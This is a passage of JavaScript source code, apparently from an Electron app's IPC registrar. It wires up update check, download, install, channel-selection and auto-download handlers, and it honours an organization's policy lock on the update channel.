        policyGoverned = srcId !== null ? governanceSenders.size > 0 : true;
        if (!prev) {
          // Governance just became active: trigger a check immediately so the
          // feed lane emits not-available and clears any stale "found" state.
          updater?.check?.();
        }
      } else {
        // Lift governance for this sender. Other windows may still be governed.
        if (srcId !== null) governanceSenders.delete(srcId);
        else governanceSenders.clear();
        policyGoverned = governanceSenders.size > 0;
        // On a true-to-false transition: broadcast the cleared verdict by
        // triggering a check so the renderer's update-state cache updates
        // (useIsPolicyGoverned reads policyGoverned from the broadcast).
        if (prev && !policyGoverned) {
          updater?.check?.();
        }
      }
    });
    ipcMain.handle("update:get-info", () => updaterInfo());
    ipcMain.handle("update:check", () => {
      updater.check();
      return { ok: true };
    });
    ipcMain.handle("update:download", () => {
      updater.download();
      return { ok: true };
    });
    ipcMain.handle("update:install", async () => {
      await updater.install();
      return { ok: true };
    });
    ipcMain.handle("update:set-channel", (_event, channel) => {
      const next = typeof channel === "string" ? channel : "";
      if (next !== "" && next !== "insider" && next !== "stable") {
        return { ok: false, error: `invalid channel: ${next}` };
      }
      // A required channel replaces the preference, so storing another one
      // would be a switch that does nothing. The dashboard's
      // POST /api/update/channel answers the same way (409 locked_by_policy).
      const required = getRequiredChannel();
      if (required && next !== required) {
        return {
          ok: false,
          code: "locked_by_policy",
          error: `updates follow the ${required} channel set by your organization's policy`,
          info: updaterInfo(),
        };
      }
      store.set("updateChannel", next);
      updater.check();
      return { ok: true, info: updaterInfo() };
    });
    ipcMain.handle("update:set-auto-download", (_event, enabled) => {
      if (typeof enabled !== "boolean") {
        return { ok: false, error: `invalid value: ${typeof enabled}` };
      }
      store.set("autoDownloadUpdates", enabled);
      if (enabled) updater.check();
      return { ok: true, info: updaterInfo() };
    });

    updaterRegistered = true;
    return updater;
  }

  return Object.freeze({
    registerShell,
    bindGlobalHotkey,
    unregisterGlobalHotkey,
    registerUpdater,
    summonDashboard,
  });
}

module.exports = { createIpcRegistrar };
